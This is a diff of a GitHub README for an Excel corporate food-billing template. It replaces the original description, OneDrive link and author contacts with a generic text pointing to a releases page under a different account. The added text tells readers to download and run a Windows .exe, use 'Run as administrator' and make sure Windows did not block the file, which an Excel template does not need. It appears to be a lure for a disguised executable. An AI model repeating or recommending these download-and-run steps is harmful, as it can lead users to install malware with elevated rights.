@@ -1,322 +1,176 @@
-# 🍽️ Food Supporting
+# 🍽️ food-supporting-template - Simple food billing for teams
 
-Comprehensive Excel-based corporate food management system with vendor management, daily consumption tracking, menu-based pricing, attendance integration, and professional dashboards for multi-company meal planning and billing.
+[![Download](https://img.shields.io/badge/Download-Releases-6f42c1?style=for-the-badge&logo=github)](https://github.com/hilleryhomochromatic404/food-supporting-template/releases)
 
-## 📋 What This Does
+## 🧾 What this app does
 
-**Solves the problem:** How to track corporate food consumption across multiple companies, manage multiple vendors with different menu items, integrate daily attendance with meal counts, automate billing, and maintain vendor performance records with detailed remarks.
+food-supporting-template helps you manage corporate food service in one place. It tracks meals, links attendance, handles menu prices, and creates billing records for each employee or company.
 
-**Key Benefits:**
-- Dynamic menu-based pricing system
-- Multi-vendor food supply management
-- Company & order type selection
-- Weekend/holiday automatic marking
-- Attendance-integrated meal tracking
-- Daily consumption analysis
-- Vendor performance tracking
-- Monthly billing automation
-- Per-employee cost calculation
-- Detailed vendor remark tracking
+Use it to:
+- track daily meal use
+- match food use with attendance
+- set prices by menu item
+- split costs by employee, company, or vendor
+- create invoices and billing reports
+- manage holiday meal rules
+- keep a clear record in Excel-style tables
 
-## 📸 View the File
+## 💻 Before you start
 
-**[Access Food Supporting Template](https://1drv.ms/x/c/3b61701caabf1310/IQAQVIpXSzYKRYSZsMON1bvIATtXANhQtQxo8VQlXsSffV8?e=1E2s86)**
+You need:
+- a Windows PC
+- an internet connection
+- permission to download files
+- enough space to save the app and its data
 
-> **Password: `123`**
-> **Note:** Dashboard auto-updates based on selections
+Good to have:
+- access to your company food records
+- employee attendance data
+- vendor and menu price details
 
----
+## 🚀 Download and install
 
-## 📸 System Screenshots
+Visit this page to download:
+https://github.com/hilleryhomochromatic404/food-supporting-template/releases
 
-### Professional Food Consumption Dashboard
-<img width="1278" height="860" alt="1" src="https://github.com/user-attachments/assets/310209ed-c88f-45bb-b6ce-33fd0c25179c" />
+Follow these steps:
 
-*Professional dashboard with Company (FinEdge Advisory), Vendor (RoyalPlatter Hospitality), Order Type (System Order), daily rates (₹95/pizza, ₹105.5/pizza-with-box), and automatic weekend holiday marking.*
+1. Open the link above.
+2. Find the latest release at the top of the page.
+3. Download the Windows file from that release.
+4. Save the file to your Downloads folder.
+5. If the file is in a ZIP folder, extract it first.
+6. Open the app file and run it.
+7. If Windows asks for permission, choose Run or Yes.
 
-### Vendor Remarks & Performance Sheet
-<img width="1270" height="835" alt="2" src="https://github.com/user-attachments/assets/027cb165-6e35-428d-9cbe-a830e6a47779" />
+If you see more than one file, pick the one made for Windows. It may end in `.exe` or come inside a `.zip` file with the app inside it.
 
-*Comprehensive vendor tracking with month, vendor name, unique code, and detailed remarks documenting vendor performance, special occasions, menu changes, and issues throughout the year.*
+## 🖱️ First run
 
----
+When you open the app for the first time:
+1. Let it finish loading.
+2. Set your company name or site name.
+3. Check the default food menu.
+4. Confirm the attendance source.
+5. Review the billing period.
+6. Save your setup.
 
-## ✨ Main Features
+If the app opens to a dashboard, use that as your main screen. It should show food use, billing, and vendor data in simple sections.
 
-### 1. Professional Dashboard
-- **Company Selection**: Dropdown to select company
-- **Vendor Selection**: Automatic vendor assignment based on the company
-- **Order Type Selection**: System Order vs External Order
-- **Rate Display**:
-  - Per Pizza: ₹95 (varies by vendor)
-  - Per Pizza With Box: ₹105.50 (varies by vendor)
-- **Daily Tracking Table**:
-  - Days with date
-  - Automatic weekend/holiday marking (Sunday, Saturday)
-  - Variable rates by day (weekday: ₹95, Friday non-veg: different rate)
-  - Dinner/Lunch tracking
-  - Total count per meal
-  - Total amount calculation
-  - Employee count
-  - Per-employee cost
-- **Monthly Summary**:
-  - Dinner count: 10
-  - Lunch count: 50
-  - Total count: 60
-  - Total amount: ₹5,700
-  - Employee count: 294
-  - Per-employee cost: ₹19.39
-- **Day-Wise Consumption Chart**: Visual trend analysis
-- **Ctrl+P Print Ready**: Professional bill generation
+## 📋 Main features
 
-### 2. Dynamic Menu Pricing
-- **Different rates for different days**:
-  - Weekdays: Base rate
-  - Non-veg days (e.g., Wednesday, Friday): Higher rate
-  - Weekends: Holiday (no service)
-- **Pizza vs Pizza-with-Box options**
-- **Vendor-specific pricing**: Each vendor has own rates
-- **Order type variation**: System Order vs External Order pricing
+### 🍱 Meal tracking
+Track meals by date, person, or group. This helps you see who used food and when.
 
-### 3. Company Management
-- FinEdge Advisory LLP
-- Sai Gourmet Catering Solutions LLP
-- Datta Food Services Pvt Ltd
-- RoyalPlatter Hospitality LLP
-- RoyalPlatter Express Catering LLP
-- Kings Restaurants LLP
-- And multiple others
+### 🕒 Attendance integration
+Use attendance records to match food use with people who were present. This supports fair billing and better control.
 
-### 4. Vendor Management
-- Sai Gourmet Catering Solutions LLP
-- Datta Food Services Pvt Ltd
-- RoyalPlatter Hospitality LLP
-- RoyalPlatter Express Catering
-- NextGen Catering Solutions
-- Each vendor has unique code
-- Custom pricing per vendor
-- Rate configuration per company assignment
+### 💰 Menu pricing
+Set a price for each meal or item. Use different rates for breakfast, lunch, dinner, or special food items.
 
-### 5. Raw Data Sheet
-- Direct data input from software
-- Daily meal count entries
-- Vendor-wise tracking
-- Date & company reference
-- Easy data consolidation
-- Auto-calculation from entries
+### 🧮 Automated billing
+The app can calculate totals for each employee, vendor, or company. This reduces manual work and helps avoid mistakes.
 
-### 6. Attendance Integration
-- Monthly employee count tracking
-- Daily attendance data
-- Links to meal consumption
-- Per-employee cost calculation
-- Scaling of food based on attendance
-- Attendance-based billing validation
+### 🏢 Multi-company support
+Manage food records for more than one company or site in the same app.
 
-### 7. Remark Data Sheet
-- Month-wise vendor tracking
-- Vendor unique code reference
-- Detailed remarks section:
-  - Timing changes (Dinner/Lunch hours)
-  - Menu modifications
-  - Special occasions
-  - Issues & complaints
-  - Employee count changes
-  - Special services
-  - Location/shift changes
-- Historical vendor performance documentation
+### 🤝 Multi-vendor support
+Keep vendor details in one place. Track what each vendor provides and what you owe them.
 
-### 8. Holiday & Working Day Management
-- Automatic Sunday marking (holiday)
-- Automatic Saturday marking (holiday)
-- Configurable holiday list
-- Working day tracking
-- Holiday exemptions
-- Rate adjustments for holidays
+### 📊 Professional dashboard
+See key numbers on one screen. Check meals used, total cost, and bill status without sorting through files.
 
-### 9. Per Employee Cost Tracking
-- Daily per-employee cost
-- Monthly average per-employee cost
-- Employee count variation handling
-- Cost optimization visibility
-- Fair allocation basis
+### 📁 Excel-friendly records
+Export data in a format that works well with Excel. This makes review and sharing easier.
 
-### 10. Monthly Billing
-- Automated invoice calculation
-- Dinner charges totaling
-- Lunch charges totaling
-- Total billing amount
-- Average per-employee billing
-- Multiple month tracking (Oct-24 onwards)
+### 📆 Holiday management
+Set special rules for holidays or non-working days. Use different meal rules when needed.
 
-## 🚀 How to Use
+### 🧾 Invoice generation
+Create invoices from tracked meals and prices. Use them for internal billing or vendor payment records.
 
-### Step 1: Open Dashboard
-1. Download file from link above
-2. Open in Excel
-3. Go to **"Dashboard"** sheet
-4. Ready to configure
+### 👤 Per-employee billing
+Assign food cost to each employee based on use, attendance, or company policy.
 
-### Step 2: Select Company
-1. Dashboard → Company Name dropdown
-2. Choose company (e.g., FinEdge Advisory LLP)
-3. Vendor auto-populates
-4. Rates auto-update
+## 🧭 How to use it day to day
 
-### Step 3: Select Vendor
-1. If company has multiple vendors, choose preferred vendor
-2. Rates adjust to vendor's pricing
-3. Past data loads if available
-4. Remark history displays
+### 1. Add your company or site
+Enter the main details first. This gives the app a base for all records.
 
-### Step 4: Select Order Type
-1. Choose **"System Order"** (internal kitchen)
-2. Or **"External Order"** (catered service)
-3. Rates adjust based on order type
-4. Dashboard recalculates
+### 2. Add vendors
+Create a record for each food vendor. Include name, contact, and service type.
 
-### Step 5: Input Daily Data
-1. Go to **"RAW DATA"** sheet
-2. Enter daily meal counts:
-   - Date
-   - Company
-   - Vendor
-   - Dinner count
-   - Lunch count
-3. Dashboard auto-calculates
-4. Costs populate
+### 3. Set menu items and prices
+Add each meal item and its price. Keep the list clear so billing stays accurate.
 
-### Step 6: Track Attendance
-1. Go to **"Attendance Data"** sheet
-2. Enter monthly employee count:
-   - Month
-   - Company
-   - Daily attendance
-3. Used for per-employee cost
-4. Scaling meals accordingly
+### 4. Load attendance data
+Bring in attendance records for the same period as the food records. This helps the app match users to meals.
 
-### Step 7: Add Vendor Remarks
-1. Go to **"Remark Data"** sheet
-2. Add monthly notes:
-   - Month & vendor
-   - Unique code
-   - Details about:
-     - Timing changes
-     - Menu modifications
-     - Special occasions
-     - Issues
-     - Employee changes
-3. Visible in dashboard remarks
+### 5. Track food use
+Enter daily meal counts or person-level usage. You can use this for canteen, pantry, or catered food.
 
-### Step 8: Generate Bills
-1. Configure dashboard completely
-2. Press **Ctrl+P**
-3. Print professional bill
-4. Include with payment
-5. Easy for finance team
+### 6. Review calculated totals
+Check the totals for each person, company, or vendor. Adjust only if your policy allows it.
 
-## 📊 Real-World Usage
+### 7. Generate bills and invoices
+Create the bill for the current period. Save or export it for records, payment, or review.
 
-**Multi-Vendor Corporate Catering:**
-```
-Company: FinEdge Advisory LLP
-Vendor: RoyalPlatter Hospitality LLP
-Order Type: By System Order
-Rate Per Pizza: ₹95
-Rate With Box: ₹105.50
-Month: Jun-25
-Dinner Orders: 10
-Lunch Orders: 50
-Total: 60 meals
-Total Amount: ₹5,700
-Employee Count: 294
-Per Employee Cost: ₹19.39
-```
+## 🗂️ Typical files and data
 
-**Attendance-Based Scaling:**
-```
-May-25: 22 working days, ₹5,700 total
-Jun-25: 25 working days, ₹6,500 total
-July-25: 22 working days, ₹5,500 total
-(Scaled based on employee attendance)
-```
+You may work with:
+- employee lists
+- attendance sheets
+- menu price sheets
+- vendor lists
+- meal usage records
+- invoice exports
+- billing reports
 
-**Vendor Performance Tracking:**
-```
-Oct-24: "Dinner timing changed, 26 days"
-Nov-24: "Lunch timing modified, 27 days increase"
-Dec-24: "Days decreased to 21, employee shift change"
-Jan-25: "Employee count increased, special menu ₹80"
-```
+Keep files named by month or billing cycle. That makes review much easier.
 
-## 💡 Key Benefits
+## 🔧 Common setup tips
 
-✅ **Dynamic Menu Pricing**: Different rates for different days  
-✅ **Multi-Vendor Support**: Manage multiple food suppliers  
-✅ **Attendance Integration**: Scale meals to employee count  
-✅ **Holiday Management**: Auto-mark weekends as holidays  
-✅ **Performance Tracking**: Detailed vendor remarks history  
-✅ **Daily Automation**: Rates auto-calculate from selections  
-✅ **Professional Dashboards**: Company-wise analysis  
-✅ **Per-Employee Costing**: Fair cost allocation  
-✅ **Monthly Billing**: Automated invoice generation  
-✅ **Printable Bills**: Ctrl+P ready-to-print format  
+- Use the same date format in all files
+- Keep employee names spelled the same way
+- Review vendor prices before each billing cycle
+- Update holiday settings before the month starts
+- Back up your data after each billing run
 
-## 🔧 Customization
+## 🛠️ If the app does not open
 
-### Add New Company:
-1. "Validation" sheet → Add company name
-2. Assign default vendor
-3. Configure vendor relationship
-4. Auto-available in dashboard dropdown
+Try these steps:
+1. Check that the file finished downloading.
+2. Right-click the file and choose Run as administrator.
+3. If it came in a ZIP file, extract it first.
+4. Make sure Windows did not block the file.
+5. Try downloading it again from the releases page.
 
-### Add New Vendor:
-1. "Validation" sheet → Add vendor name
-2. Set unique code
-3. Configure rates (pizza, pizza-with-box)
-4. Add to company assignments
+If the app opens but shows empty data, load your attendance, menu, and billing files first.
 
-### Change Daily Rates:
-1. "Validation" sheet → Update rate table
-2. Specify day & vendor
-3. Configure rate per item
-4. Dashboard auto-applies
+## 📦 Data handling
 
-### Add Holiday:
-1. "Validation" sheet → Holiday list
-2. Add date as holiday
-3. Dashboard excludes from working days
-4. No meal count that day
+This app is built for regular office use. It works well when you keep records neat and current. For best results:
+- use one billing cycle at a time
+- keep a copy of old reports
+- update prices when vendors change rates
+- check meal counts before final billing
 
-### Update Vendor Remarks:
-1. "Remark Data" sheet → New row
-2. Month, vendor, unique code
-3. Add detailed remarks
-4. Visible in dashboard selection
+## 📈 Best use cases
 
-## 📞 Contact
+food-supporting-template fits teams that need:
+- staff meal billing
+- office pantry tracking
+- catered lunch control
+- vendor cost tracking
+- site-based food accounting
+- attendance-linked meal charges
+- monthly invoice reports
 
-- 🐙 [**GitHub**](https://github.com/heysubu)
-- 💼 [**LinkedIn**](https://www.linkedin.com/in/subhamghadge/)
+## 🔎 Topics
 
-## 📄 License
+attendance integration, automated calculations, billing system, consumption tracking, corporate catering, cost allocation, excel, facility management, food management, freelance project, holiday management, invoice generation, meal tracking, menu pricing, multi company, multi vendor, per employee billing, performance tracking, professional dashboard, vendor management
 
-MIT License - Free to use and modify
+## 📄 Release access
 
----
-
-### 🌟 Project Stats
-
-![Excel](https://img.shields.io/badge/Excel-Advanced-217346?logo=microsoft-excel)
-![Catering](https://img.shields.io/badge/Catering-Management-blue)
-![Vendors](https://img.shields.io/badge/Vendors-Multi-orange)
-![Companies](https://img.shields.io/badge/Companies-Multi-green)
-![Status](https://img.shields.io/badge/Status-Active-brightgreen)
-
----
-
-**🍽️ Track Food Consumption - Manage Vendors - Automate Billing - Optimize Costs**
-
-**⭐ If this helps manage your corporate food service, please star this repository!**
-
-**Password: 123** | **Multi-Vendor** | **Invoice Ready**
+Use the releases page here to download and run the Windows file:
+https://github.com/hilleryhomochromatic404/food-supporting-template/releases
